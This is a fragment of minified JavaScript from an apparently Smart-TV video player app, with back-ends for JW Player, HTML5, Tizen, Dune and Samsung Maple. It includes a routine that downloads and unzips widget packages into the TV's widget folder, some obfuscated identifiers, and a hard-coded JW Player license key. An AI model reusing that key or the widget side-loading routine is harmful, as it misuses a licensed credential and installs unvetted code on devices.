c.setidprop("jw",0)},quality:function(set){var quals=jwplayer("jw").getQualityLevels();if(quals&&quals.length){if(set!=null){if(set>=quals.length)set=0;else if(set<0)set=quals.length-1;jwplayer("jw").setCurrentQuality(set);this.qualCur=set}else this.qualCur=jwplayer("jw").getCurrentQuality()||0;return{count:quals.length,name:(quals[this.qualCur]&&quals[this.qualCur].label||""),sel:this.qualCur}}else{this.qualCur=this.qualName=0;return}},audioTracks:function(set){var tracks=jwplayer("jw").getAudioTracks();if(tracks&&tracks.length){if(set!=null){if(set>=tracks.length)set=0;else if(set<0)set=tracks.length-1;jwplayer("jw").setCurrentAudioTrack(set);this.audioCur=set}else this.audioCur=jwplayer("jw").getCurrentAudioTrack()||0;this.audioName=jwplayer("jw").getAudioTracks()[this.audioCur].name||"Default";return{count:tracks.length,name:this.audioName,sel:this.audioCur}}else{this.audioCur=this.audioName=0;return}},getInfo:function(m){var html="";vPlayer.resolution="";var n=parseInt(maJor.params.get('xmode'))||0;if(m=="prop")return this.optScreenN[n];if(jwplayer("jw").getVisualQuality()&&jwplayer("jw").getVisualQuality().level&&jwplayer("jw").getVisualQuality().level.width)vPlayer.resolution=jwplayer("jw").getVisualQuality().level.width+"x"+jwplayer("jw").getVisualQuality().level.height;else if($_("jwvideo")){if($_("jwvideo").videoWidth)vPlayer.resolution=$_("jwvideo").videoWidth+"x"+$_("jwvideo").videoHeight}
vPlayer.ratioText=this.optScreenN[maJor.params.get("xmode")]||"";html+=" "+(jwplayer("jw").getProvider().name||"");if(jwplayer("jw").getQualityLevels().length>1){var quality=jwplayer("jw").getCurrentQuality();if(quality==0)html+=" Auto ";else html+=" Quality: "+jwplayer("jw").getQualityLevels()[quality].label+" ["+quality+"/"+jwplayer("jw").getQualityLevels().length+"]"}
if(jwplayer("jw").getAudioTracks().length>1){var curA=jwplayer("jw").getCurrentAudioTrack();if(curA==0)curA="Auto";html+=" Аудио: "+jwplayer("jw").getAudioTracks()[jwplayer("jw").getCurrentAudioTrack()].name+" ["+curA+"/"+jwplayer("jw").getAudioTracks().length+"]"}
if(jwplayer("jw").getPlaybackRate()!=1)html+=" Rate: "+jwplayer("jw").getPlaybackRate()+"x";return html},setSize:function(n){if(n==null)n=parseInt(maJor.params.get('xmode'))||0;if(n>3)n=0;else if(n<0)n=3;maJor.params.set('xmode',n);jwplayer().setConfig({"stretching":this.optScreenV[n]})},start:function(url,start,jwtype){try{var c=vPlayer,m=this;this.prate=null;$_("video").style.display="none";$_("jw").style.display="block";jwplayer.key="HY8B2VALIOA/I+mqBXK+3/Jz9OQkc+4GJMvoKWJoV8GFT9Dr";if(!jwtype)jwtype=(is_m3u8(url)==2?"m3u8":"m4v");c.l1O0Ol1iOVI0O1Ypr("jws:"+jwtype);function getJWtype(){if(typeof gP().global.allvast=="object")return null;else return jwtype}
var jwConfig={"file":url,"height":"100%","width":"100%","type":getJWtype(),"autostart":!0,"androidhls":maJor.build>=7?true:!1,"hlsjsdefault":(jwtype=="mp4"?false:!0),"stretching":this.optScreenV[maJor.params.get("xmode")],hlsjsConfig:{defaultBandwidthEstimate:1400000}};if(vPlayer.playElement){var vpl=vPlayer.playElement;if(vpl.preview)jwConfig.image=gVs(vPlayer.playElement,"preview");if(vpl.json_url){for(var i in vpl.json_url){}}}
jwplayer("jw").setup(jwConfig);jwplayer("jw").on("ready",function(event){m.setMini()});jwplayer().on('firstFrame',function(){c.OnBufferingComplete();if(start||vPlayer.setStart)this.seek(start||vPlayer.setStart);vPlayer.setStart=0});jwplayer("jw").on("adBreakEnd",function(event){});jwplayer("jw").on('warning',function(s){});jwplayer("jw").on('complete',function(){c.endvideo()});jwplayer("jw").on('time',function(){c.getVideoPlayInfo()});jwplayer("jw").on("error",c.eventerrvideo);jwplayer("jw").on("setupError",function(event){if(event.message=="No playable sources found"&&jwtype!="mp4"){c.player().start(url,start,"mp4")}else{vPlayer.lll0Q10I0lI1O0Oll0OOYpr(1);maJor.statusbar("JW player error: "+event.message,"error")}});jwplayer("jw").on("adLoadedXML",function(event){adsPage.state(2);adsPage.rekBox();maJor.statusbar("Ad","hint")});jwplayer("jw").on("adBreakEnd",function(event){adsPage.state(0);adsPage.rekBox()});jwplayer("jw").on("all",function(event){});this.pause();this.play()}catch(e){maJor.popUp("Нет поддержки JW player устройством (можете поменять в настройках): "+e.message+" "+url,3000)}},stop:function(){jwplayer("jw").stop()},exit:function(){$_("jw").style.display="none"},play:function(){jwplayer("jw").play()},seek:function(sec){jwplayer("jw").seek(sec)},getRate:function(){return(this.prate||jwplayer("jw").getPlaybackRate()||1)},rate:function(rate){jwplayer("jw").setPlaybackRate(rate);this.prate=rate},getPosition:function(){return jwplayer("jw").getPosition()},getTotal:function(){return jwplayer("jw").getDuration()}},playerjs:{name:"playerjs",exis:function(){return 1},fullscreen:function(){$_("playerjs").contentWindow.postMessage({"api":"fullscreen"},"*");$_("playerjs").style.width="100%";$_("playerjs").style.height="100%"},volume:function(x){if(x!=null){this.setVol=x;$_("playerjs").contentWindow.postMessage({"api":"volume","set":(x/100).toFixed(2)},"*")}
return(this.setVol||100)},play:function(){$_("jw").style.zIndex="0";$_("playerjs").contentWindow.postMessage({"api":"play"},"*")},pause:function(){$_("playerjs").contentWindow.postMessage({"api":"pause"},"*")},start:function(url,start){var c=vPlayer;this.setVol=this.setVol||100;$_("video").style.display="none";$_("jw").style.display="block";if(gV(c.playElement,"type")=="iframe"){$_("jw",'<iframe id="playerjs2" style="z-index:2;height:100%;width:100%;margin:0px; padding:0px;" allow="autoplay" sandbox="allow-scripts allow-same-origin" frameborder="0" '+'src=\'javascript:d=document;d.clear();\'></iframe>');setTimeout(function(){$_("playerjs2").src="javascript:d=document;d.clear();d.open();"+"d.write(\"<!DOCTYPE html><html>"+"<body style=\\\"width:"+maJor.screen().w+"px;height:"+maJor.screen().h+"px;overflow: hidden;\\\">"+"<script>"+"var $=parent.$;"+"function jwonload(){parent.$_(\\\"jw\\\").style.zIndex=\\\"2\\\";setTimeout(\\\"parent.vPlayer.player().play();\\\",5500);parent.maJor.statusbar(\\\"off\\\");}"+"</script>"+"<iframe onload=\\\"jwonload();\\\" allow=\\\"autoplay\\\" sandbox=\\\"allow-scripts allow-same-origin\\\" style=\\\"width:100%;height:100%;margin: 0px; border:none;\\\" id=\\\"playerjs\\\" src=\\\""+url.replace("#playerjs","")+"\\\" />"+"</body>"+"</html>\");d.close();"},150)}else $_("jw","<iframe allow='autoplay' onload='$_(\"jw\").style.zIndex=\"2\";setTimeout(\"vPlayer.player().play();\",9500); ' style='width:100%;height:100%;margin-top: 0px; border:none;' id='playerjs' src='"+url.replace("#playerjs","")+"' />")},stop:function(){$_("jw","")},exit:function(){$_("jw").style.zIndex="0";$_("jw").style.display="none"},getPosition:function(){return vPlayer.curTime||0},getTotal:function(){return vPlayer.totalTime||0},message:function(event){var c=vPlayer;if(event.data.event=="inited"){$_("jw").style.zIndex="2";this.play()}else if(event.data.event=="resumed"){c.paused=!1}else if(event.data.event=="paused"){c.paused=!0}else if(event.data.event=="ended"){c.endvideo()}else if(event.data.event=="time"){c.curTime=Math.ceil(event.data.data);c.totalTime=Math.ceil(event.data.duration);if(c.curTime>3)$_("jw").style.zIndex="0";else $_("jw").style.zIndex="2";if(c.totalTime)c.getVideoPlayInfo(c.curTime,c.totalTime)}else if(event.data){if(typeof event.data.duration!="undefined")vPlayer.totalTime=Math.ceil(event.data.duration);if(typeof event.data.played!="undefined")vPlayer.curTime=Math.ceil(event.data.played);if(c.curTime>3)$_("jw").style.zIndex="0";else $_("jw").style.zIndex="2";c.getVideoPlayInfo(c.curTime,c.totalTime)}},seek:function(n){$_("playerjs").contentWindow.postMessage({"api":"seek","set":n},"*")}},download:{name:"download",exis:function(){return 1},stop:function(){},exit:function(){},start:function(url){document.location=url}},external:{name:"external",exis:function(){return 1},stop:function(){},exit:function(){},start:function(){}},html5:{name:"html5",exis:function(){return 1},volume:function(x){if(x!=null)video.volume=(x/100).toFixed(2);return Math.ceil(video.volume*100)},fullscreen:function(){if(video.requestFullScreen)video.requestFullScreen();else if(video.mozRequestFullScreen)video.mozRequestFullScreen();else if(video.webkitRequestFullScreen)video.webkitRequestFullScreen();$_("video").style.width="100%";$_("video").style.height="100%"},pause:function(){video.pause()},pName:["AUTO","FULL","16/9","4/3","MANUAL"],getInfo:function(m){var text="";var n=parseInt(maJor.params.get('xmode'))||0;text=this.pName[n]||n;if(m=="prop")return text;vPlayer.resolution=(video.videoWidth?video.videoWidth+"x"+video.videoHeight:"");if(n==4)text+=" "+maJor.params.get("Pw")+"x"+maJor.params.get("Ph");vPlayer.ratioText=text;text="";if(this.getRate()!=1)text+=" Rate: "+this.getRate()+"x";return text},audioTracks:function(set){var tracks=video.audioTracks,ca=tracks&&tracks.length||0;if(ca){if(set!=null){set=set>=ca?0:(set<0?ca-1:set);for(var i=0;i<ca;i++){video.audioTracks[i].enabled=(i===set)}
this.audioCur=set}
this.audioCur=this.audioCur||0;var audioTrack=tracks&&tracks[this.audioCur];this.audioName=audioTrack?(audioTrack.language||audioTrack.label||""):"";return{count:ca,name:this.audioName,sel:(this.audioCur||0)}}else{this.audioCur=this.audioName=0;return{count:0,name:"",sel:0}}},setSize:function(n){var c=vPlayer;if(c.is_mini())return;if(n==null)n=parseInt(maJor.params.get('xmode'))||0;if(n<0)n=4;else if(n>4)n=0;maJor.params.set('xmode',n);var xWidth=0;var videoRatio=video.videoWidth/video.videoHeight,tagRatio=16/9;if(n==4){maJor.params.set('Pw',parseFloat(maJor.params.get('Pw')));maJor.params.set('Ph',parseFloat(maJor.params.get('Ph')));if(maJor.params.get('Pw')<200)maJor.params.set('Pw',1280);if(maJor.params.get('Ph')<200)maJor.params.set('Ph',720);tagRatio=parseInt(maJor.params.get("Pw"))/parseInt(maJor.params.get("Ph"));video.style.top="0px";video.style.left="0px";video.style.width=maJor.params.get("Pw")+"px";video.style.height=maJor.params.get("Ph")+"px";if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}}else if(n==1){if(videoRatio>=tagRatio-0.02){video.style.width=window.innerWidth+"px";video.style.height=window.innerHeight+"px";video.style.top="0px";video.style.left="0px";video.style.WebkitTransform="scaleY(1)"}else{video.style.width=window.innerWidth+16+"px";video.style.height=window.innerHeight+9+"px";video.style.top="-6px";video.style.left="-8px";tagRatio=4/3;if(videoRatio<tagRatio)video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")";else video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}}else if(n==2){if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
video.style.width=window.innerWidth+16+"px";video.style.height=window.innerHeight+9+"px";video.style.top="-6px";video.style.left="-8px"}else if(n==3){tagRatio=4/3;if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
video.style.width=xWidth?"2576px":"1728px";video.style.height=xWidth?"1449px":"976px";video.style.top=xWidth?"-186px":"-128px";video.style.left=xWidth?"-328px":"-224px"}
if(n==0){video.style.width="100%";video.style.height="100%";video.style.top="0px";video.style.left="0px";video.style.WebkitTransform=""}},setMini:function(){var c=vPlayer;if(l0lIl1lTqx011IYpr=="ifrhtml5")var idv="other";else idv="video";if(c.is_mini())c.setidprop(idv,"mini");else c.setidprop(idv,0)},startAudio:function(u){if(l0lIl1lTqx011IYpr=="audio"){$_("other").style.width="1%";$_("other").style.height="1%";$_("other").style.display="block";$_("other",'<audio id="audio" autoplay="autoplay" src="'+u+'"></audio>');video=$_("audio")}else{video=$_("video");video.src=u;if(maJor.platform().match(/lg/))video.type="video/mp4";else video.type="audio/mpeg";video.autoplay=!0}
video.play()},start:function(url,start){try{this.name=l0lIl1lTqx011IYpr;if(ua.match(/sony/))var type="video/mpeg";else if(pstream){if(maJor.platform().match(/lg/))type="application/x-netcast-av";else if(maJor.platform()=="sharp"){type="application/vnd.apple.mpegurl";vPlayer.l1O0Ol1iOVI0O1Ypr("Sharp iptv stream!")}else type="application/vnd.apple.mpegurl"}else if(url.indexOf(".mp3")>0&&!maJor.platform().match(/lg/))type="audio/mpeg";else type="video/mp4";this.setMini();if(start)vPlayer.setStart=start;if(l0lIl1lTqx011IYpr=="ifrhtml5"){$_("video").style.display="none";$_("jw").style.display="none";$_("other").style.display="block";$_("other","<iframe style='display:block;background-color:black;position:absolute;top:0px;left:0px;border:none;margin:0px;padding:0px;width:100%;height:100%;' id='piframe' src='javascript:d=document;d.clear();d.open();"+"d.write(&quot;&lt;html&gt;   &lt;/html&gt;)'>");var iframe=$_("piframe");iframe=iframe.contentWindow||(iframe.contentDocument.document||iframe.contentDocument);iframe.document.open();iframe.document.write("<!DOCTYPE html><html>"+"<body style='margin:0px; padding:0px;width:100%;height:100%;overflow: hidden;'>"+"<video id='piframevideo' style='width:100%;height:100%;' autoplay=true type='"+type+"' src='"+url+"'> </video>"+"<script>"+"var video=document.getElementById('piframevideo');"+"var fst=0;"+"video.addEventListener('loadedmetadata', parent.vPlayer.OnBufferingComplete);"+"video.addEventListener('error', parent.vPlayer.eventerrvideo);"+"video.onmousemove=parent.vPlayer.OnMouseMove;	"+"document.addEventListener('keydown',parent.keyHandler,false);"+"parent.video=video;"+"</script>"+"</body></html>");iframe.document.close()}else{video=$_("video");video.addEventListener('loadedmetadata',vPlayer.OnBufferingComplete);video.addEventListener('error',vPlayer.eventerrvideo);video.src=url;video.style.display="block";$_("jw").style.display="none";video.type=type;video.autoplay=!0;if(maJor.platform()=="android-device"){video.addEventListener("click",function(){video.play()})}else video.play()}}catch(e){jsshowErr("Error html5 player (можете поменять в настройках): "+e.message+" "+url,2)}},stop:function(){if(video){this.pause()}},exit:function(){if(video)video.style.display="none"},play:function(){video.play()},seek:function(sec){video.currentTime=sec},getRate:function(){return video.playbackRate||1},rate:function(rate){video.playbackRate=rate},getPosition:function(){return video.currentTime},getTotal:function(){return video.duration}},OnMouseMove:function(){if(handler.match(/player|qual/)){vPlayer.showPlayer();vPlayer.triggerHide()}},image:{name:"image",exis:function(){return 1},startslide:function(){var c=this;clearTimeout(this.slideTimer);this.slideTimer=setTimeout(function(){if(getSelect()+1<gP().channels.length){Il01QllQll().focused(getSelect()+1);if(is_img(curCh("stream_url"))||curCh("type")=="img"){$_("jwmedia").src=curCh("stream_url");c.startslide()}else vPlayer.lll0Q10I0lI1O0Oll0OOYpr()}else{if(parseInt(maJor.params.get('next'))==3){setSelect(-1);c.startslide()}else vPlayer.lll0Q10I0lI1O0Oll0OOYpr()}},slide_mode)},pause:function(){clearTimeout(this.slideTimer);if(adsPage.state()!=2)kjtYpr.popUp("_FPSlideshow_: _FPOstanovleno_",1200);vPlayer.paused=!0},start:function(url){if(url.indexOf("image/")==0)url=url.substr(6);video.style.display="none";$_("jw").style.display="block";$_("infPl","IMAGE");var b="<div style='width:100%;height:100%;text-align:center;background-color:black;'><img id='jwmedia' style='visibility:hidden;' onload='imgonload(this);' src='"+url+"' align='center' /></div>";$_("jw",b);if(!adsPage.state())this.startslide();else if(adsPage.state()==2){adsPage.slide()}},stop:function(){this.pause()},exit:function(){$_("jw","");$_("jw").style.display="none";if(vPlayer.audio.played())if($_("vk_audio").style.zIndex=="-5"){$_("vk_audio").style.zIndex="0";$_("vk_audio").style.display="block"}},play:function(){if(!adsPage.state()){if(!vPlayer.paused){if(slide_mode==5000)slide_mode=9000;else if(slide_mode==9000)slide_mode=13000;else slide_mode=5000}
startslide();kjtYpr.popUp("_FPSlideshow_: "+(slide_mode/1000)+"_FPsec_.",1200)}},seek:function(sec){},getPosition:function(){},getTotal:function(){}},dune:{name:"dune",exis:function(){return 1},pause:function(){if(stb.canPause())stb.pause();else stb.stop()},setMini:function(){var c=vPlayer;if(c.is_mini())c.setidprop("dune-api","mini");else c.setidprop("dune-api",0)},startAudio:function(u){stb.play(u)},setSize:function(n){if(n==null)n=parseInt(maJor.params.get('xmode'))||0;if(n>5)n=1;else if(n<1)n=5;maJor.params.set('xmode',n);if(n==1)stb.SetAspect(0x10);else if(n==2)stb.SetAspect(0x20);else if(n==3)stb.SetAspect(0x30);else if(n==4)stb.SetAspect(0x40);else if(n==5)stb.SetAspect(0x50)},start:function(url){this.setMini();$_("dune-api").style.zIndex="1";stb.play(url);this.setSize()},stop:function(){stb.stop()},exit:function(){$_("dune-api").style.zIndex="0"},play:function(){stb.resume()},seek:function(sec){stb.setPositionInSeconds(sec)},getPosition:function(){return stb.getPositionInSeconds()},getTotal:function(){return stb.getLengthInSeconds()}},tizen:{name:"tizen",sub_name:"",exis:function(){return webapis&&webapis.avplay},pause:function(){webapis.avplay.pause()},subtitle:function(set){if(this.extra_sub.length){set=set||0;set=set>this.extra_sub.length?0:set<0?this.extra_sub.length:set;this.sub_sel=set;this.sub_name=set&&this.extra_sub[set-1]?(this.extra_sub[set-1].name||"Sub "+set):"_FPOtkl._";webapis.avplay.setSilentSubtitle(!set);if(set&&this.extra_sub[set-1])webapis.avplay.setSelectTrack("TEXT",this.extra_sub[set-1].id)}},audioTracks:function(set){if(webapis.avplay.getState()!="NONE"&&webapis.avplay.getState()!="IDLE"){var trackInfo=webapis.avplay.getTotalTrackInfo();this.extra_audio=[];this.extra_sub=[];for(var i=0;i<trackInfo.length;i++){var name="";try{var name="";if(trackInfo[i]&&trackInfo[i].extra_info){name=trackInfo[i].extra_info.language||(lIlI1VBOOlI01QYpr(trackInfo[i].extra_info)&&lIlI1VBOOlI01QYpr(trackInfo[i].extra_info)["language"])||""}}catch(e){jsshowErr("Error get audio track "+i+" name "+l1OOl0I0IASY10lQ10Ypr(trackInfo[i])+e.message,-1);name=""}
if(trackInfo[i].type=="AUDIO")
this.extra_audio.push({id:i,name:name});if(trackInfo[i].type=="TEXT")
this.extra_sub.push({id:i,name:name})}
if(this.extra_sub.length>1)jsshowErr("trackInfo:"+l1OOl0I0IASY10lQ10Ypr(trackInfo),-1);if(this.extra_audio.length>1){if(set!=null){if(set>=this.extra_audio.length)set=0;else if(set<0)set=this.extra_audio.length-1;webapis.avplay.setSelectTrack("AUDIO",this.extra_audio[set].id);this.audioCur=set}else this.audioCur=this.audioCur||0;return{count:this.extra_audio.length,name:this.extra_audio[this.audioCur].name,sel:this.audioCur}}}},getInfo:function(m){var n=n||maJor.params.get('xmode');if(n==0)var text="ORIGINAL";else if(n==1)text="FULL";else text="AUTO";if(m=="prop")return text;vPlayer.ratioText=text;text="";try{var streaminfo=webapis.avplay.getCurrentStreamInfo();if(streaminfo){for(var i=0;i<streaminfo.length;i++){if(streaminfo[i].type=="VIDEO"){var j=lIlI1VBOOlI01QYpr(streaminfo[i].extra_info);if(!isNaN(j.Width)&&j.Width>0)vPlayer.resolution=" "+j.Width+"x"+j.Height}}}}catch(e){}
return text},setSize:function(n){var c=vPlayer;if(c.is_mini())return;if(n==null)n=parseInt(maJor.params.get('xmode'))||0;if(n<0)n=2;else if(n>2)n=0;if(n==0)webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_LETTER_BOX");else if(n==1)webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_FULL_SCREEN");else if(n==2)webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_AUTO_ASPECT_RATIO");maJor.params.set('xmode',n)},setMini:function(){var c=vPlayer;if(c.is_mini()){webapis.avplay.setDisplayRect(1292,675,628,405);c.setidprop("av-player","mini");$_("av-player").style.zIndex=1;$_("av-player").style.position="absolute"}else{c.setidprop("av-player",0);$_("av-player").style.zIndex=0;$_("av-player").style.position="static";webapis.avplay.setDisplayRect(0,0,1920,1080);this.setSize()}},startAudio:function(u){try{webapis.avplay.stop();webapis.avplay.open(u);webapis.avplay.setListener({oncurrentplaytime:function(currentTime){vPlayer.curTime=currentTime;vPlayer.getVideoPlayInfo()},ondrmevent:function(e,f){},onerror:function(e,f){}});webapis.avplay.prepareAsync(function(e){webapis.avplay.play();vPlayer.getVideoPlayInfo()},function(e){vPlayer.lll0Q10I0lI1O0Oll0OOYpr();kjtYpr.popUp(e.toString(),2500)})}catch(e){kjtYpr.popUp(e.toString(),2500)}},start:function(url,start){this.speedrate=1;$_("av-player").style.display="block";$_("av-player").onmousemove=vPlayer.OnMouseMove;this.sub_sel=0;this.audioCur=0;this.extra_audio=[];this.extra_sub=[];try{if(webapis.avplay.getState()!="NONE"&&webapis.avplay.getState()!="IDLE")webapis.avplay.stop()}catch(e){kjtYpr.popUp("Error 1<br>"+e.message,4000)}
webapis.avplay.open(url);if(start||vPlayer.setStart)this.seek(start||vPlayer.setStart);vPlayer.setStart=0;this.setMini();webapis.avplay.setListener({onbufferingstart:vPlayer.OnBufferingStart,onbufferingprogress:vPlayer.OnBufferingProgress,onbufferingcomplete:vPlayer.OnBufferingComplete,onsubtitlechange:function(duration,text,type,attriCount,attributes){clearTimeout(vPlayer.subtitles.timerSub);$_("subtitle").style.display="block";$_("subtitle",text);vPlayer.subtitles.timerSub=setTimeout('$_("subtitle","");',duration)},onstreamcompleted:function(){vPlayer.endvideo()},oncurrentplaytime:function(currentTime){vPlayer.curTime=currentTime},ondrmevent:function(e,f){},onerror:function(e,f){kjtYpr.popUp("Err video:"+e.toString()+f.toString(),2500);vPlayer.eventerrvideo()}});webapis.avplay.prepareAsync(function(e){webapis.avplay.play();vPlayer.getVideoPlayInfo();vPlayer.player().onstart=function(){setTimeout(function(){if(vPlayer.elState.get("mkv_sub_sel")){vPlayer.player().audioTracks();maJor.popUp("Mkv subtitle set: "+vPlayer.elState.get("mkv_sub_sel")+"/"+vPlayer.player().extra_sub.length,2500);vPlayer.player().subtitle(vPlayer.elState.get("mkv_sub_sel"))}else webapis.avplay.setSilentSubtitle(!0);if(vPlayer.elState.get("mkv_audio")){vPlayer.player().audioTracks(vPlayer.elState.get("mkv_audio"))}},1300)}},function(e){vPlayer.l1O0Ol1iOVI0O1Ypr("Error 2: "+e.toString());vPlayer.eventerrvideo()})},stop:function(){webapis.avplay.stop();webapis.avplay.close()},exit:function(){$_("av-player").style.display="none"},play:function(){webapis.avplay.play()},seek:function(sec){webapis.avplay.seekTo(sec*1000)},getRate:function(){return this.speedrate||1},rate:function(rate){if(webapis.avplay.getState()!="NONE"&&webapis.avplay.getState()!="IDLE"){this.speedrate=rate;webapis.avplay.setSpeed(rate)}else vPlayer.l1O0Ol1iOVI0O1Ypr("Video not ready!")},getPosition:function(){return webapis.avplay.getCurrentTime()/1000},getTotal:function(){return webapis.avplay.getDuration()/1000}},maple:{name:"maple",exis:function(){return 1},pause:function(){if(this.SefPlugin)this.SefPlugin.Execute('Pause');else this.plugin.Pause()},mode3D:0,Set3Dtype:function(n){var c=vPlayer;if(this.Screen3Dplugin){this.mode3D+=n;if(this.mode3D>2)this.mode3D=0;else if(this.mode3D<0)this.mode3D=2;if(this.mode3D==1)c.l1O0Ol1iOVI0O1Ypr('3D SIDE - BY - SIDE');else if(this.mode3D==2)c.l1O0Ol1iOVI0O1Ypr('3D TOP - BOTTOM');else c.l1O0Ol1iOVI0O1Ypr('3D OFF');this.Screen3Dplugin.Set3DEffectMode(this.mode3D)}else c.l1O0Ol1iOVI0O1Ypr('3D _FPnePodderzhivaetsya_!')},sefInstall:function(m,s){var c=this;this.alls+=s+"|";kjtYpr.popUp(s);var name=c.wint_name,len="";if(window.FileSystem){var arrFiles=(new FileSystem()).readDir('/mtd_rwcommon/common');if(arrFiles){for(var i=2;i<arrFiles.length;i++)if(arrFiles[i].name==name+".zip")len=ToSize(arrFiles[i].size);}}
var cc=s.split("?");if(cc[0]=="1001"){kjtYpr.inf("Загрузка ("+len+")! "+cc[1]+"%",1200,"#eee");cc[1]=cc[1]/1.2;if(cc[1]<10)cc[1]=10}else if(cc[0]=="1000"){kjtYpr.popUp("_FPIdetUstanovkaVidgeta_...");kjtYpr.inf("_FPUstanovka_ ("+len+")...",1200,"#eee");setTimeout(function(){c.FilePlugin.Unzip('/mtd_rwcommon/widgets/user/'+name+".zip",'/mtd_rwcommon/widgets/user/'+name+'/');if(c.FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+"/config.xml")){kjtYpr.inf("_FPVidget_ "+name+" _FPuspeshnoUstanovlen_!",2000,"green");kjtYpr.popUp("<b>_FPViklIvklTVchtobiUv_ "+name+" _FPvSmHubVidgNaidDop_",6000);is_loadpage(0);c.urlinst='/mtd_rwcommon/widgets/user/'+name+'/index.html';confirmed.create("_FPOpenWidget_ "+name+"?<br> _FPrecomOpenFromSmartHub_","Open app").fun=[function(){document.location=c.urlinst}]}else{is_loadpage(0);kjtYpr.inf("_FPOshibkaUstanovki_ "+name+" !",2000,"orange")}},1000)}},pasteFile:function(from,to,names){var c=this;var ss=from.split("-|-");var ssn=names.split("-|-");for(var i=0;i<ss.length;i++){var x=this.usbCopy(ss[i],to,ssn[i]);if(x==2){c.retlast=ss.length;ss.splice(i,1);ssn.splice(i,1);i--}else if(x==1){c.retlast=ss.length;c.rettm="_FPZagruzka_ "+ssn[i]+" _FPQueue_: "+(ss.length-1)+" _FPPressStopToCancel_";maJor.statusbar(c.rettm,"copy");ss.splice(i,1);ssn.splice(i,1);i--;if(gP("lO10111O0001lOl00Ypr").replace("usb://","").replace("xml://","")==to){Il01QllQll().reload()}}else{kjtYpr.inf("Err paste files",1500);break}}},usbCopy:function(usbPath,to,names){var c=this;try{if(copyUsbMode==1)return 0;c.FilePlugin=$_('pluginObjectFileSystem');if(usbPath.indexOf("http")==0){if(c.SefPlugin){var name=usbPath.substr(usbPath.lastIndexOf("/")+1);if(name.indexOf("?")>0)name=name.substr(0,name.indexOf("?"));if(names){names=totranslit(names,!1).replace(/[^a-zA-Z0-9.]/g,'_');names+=name.substr(name.lastIndexOf("."));name=names}
if(c.FilePlugin.IsExistedPath(to+'/'+name)){if(copyUsbMode==0){copyUsbMode=1;confirmed.create("","_FPexistOverwrite_?","_FPOverwriteAll_|_FPSkipAll_").fun=[function(){copyUsbMode=2},function(){copyUsbMode=3}];return 0}else if(copyUsbMode==3){maJor.statusbar("_FPSkipAll_ "+name,2000);return 2}}
c.SefPlugin.Open("Download","1.000","");c.SefPlugin.OnEvent=function(m,s){var c=s.split("?");if(c[0]!="1000"){c.rettm="_FPZagruzka_ "+c[1]+"% "+c.retname+" _FPQueue_: "+c.retlast+" _FPPressStopToCancel_";maJor.statusbar(c.rettm,"copy")}else maJor.statusbar("off")};if(!c.SefPlugin.Execute('StartDownFile',usbPath,to+'/'+name,1,1))return-1;else{kjtYpr.inf("_FPZagruzka_! _FPQueue_: "+c.retlast+" _FPPressStopToCancel_!",2000);c.retname=name;return 1}}else kjtYpr.inf("_FPnePodderzhivaetsya_ на вашем ТВ!",2000,"orange")}else{c.FilePlugin.Copy(usbPath,to)}}catch(e){kjtYpr.popUp(e.message)}},savezipfile:function(url,n){var c=this;c.alls="";clearTimeout(c.siptimer);c.siptimer=setTimeout(function(){if(!c.alls)c.sefInstall(1,"1000?1")},20000);kjtYpr.popUp(url+"...");c.urlinst="";c.FilePlugin=$_('pluginObjectFileSystem');if(Wdg.exec(url)){if(n==null)var name=url.substr(url.lastIndexOf("/")+1).replace(/.zip/i,"");else name=n;c.wint_name=name;if(c.FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')&&!wlistRewrite){clearTimeout(c.siptimer);is_loadpage(0);kjtYpr.inf("_FPVidget_ "+name+" _FPuzheEstVustanovlennih_!",2000,"red");c.urlinst='/mtd_rwcommon/widgets/user/'+name+'/index.html';confirmed.create("_FPOpenWidget_ "+name+"?<br> _FPrecomOpenFromSmartHub_","Open app").fun=[function(){document.location=c.urlinst}]}else if(c.SefPlugin){c.SefPlugin.Open("Download","1.000","");c.SefPlugin.OnEvent=this.sefInstall;if(c.SefPlugin.Execute('StartDownFile',url,'/mtd_rwcommon/widgets/user/'+name+".zip",10,10)){is_loadpage(1)}else kjtYpr.inf("_FPOshibka_!",2000,"orange")}else kjtYpr.inf("_FPnePodderzhivaetsya_ на вашем ТВ!",2000,"orange")}},abf:[0.05,0.1,0.2,0.3,0.5,0.7,1,1.2,1.8,2.5,3,4,5,6,7,8,9,10,13,15,20],SetBuffer:function(buf){buf=buf||vPlayer.buf||2;buf=Math.min(Math.max(buf,1),this.abf.length-1);if(buf!=2){var all_buf=buf<=17?10:20;var x_buf=all_buf*1048576;var x_ibuf=this.abf[buf]*1048576;if(this.SefPlugin){this.SefPlugin.Execute('SetInitialBuffer',x_ibuf);if(buf>3){this.SefPlugin.Execute('SetTotalBufferSize',x_buf);this.SefPlugin.Execute('SetPendingBuffer',x_ibuf)}}else{this.plugin.SetInitialBuffer&&this.plugin.SetInitialBuffer(x_ibuf);if(buf>3){this.plugin.SetTotalBufferSize&&this.plugin.SetTotalBufferSize(x_buf);this.plugin.SetPendingBuffer&&this.plugin.SetPendingBuffer(x_ibuf)}}}},volume:function(x){if(x!=null&&this.plaginAudio){if(x<50)this.plaginAudio.SetVolumeWithKey(1);else this.plaginAudio.SetVolumeWithKey(0)}
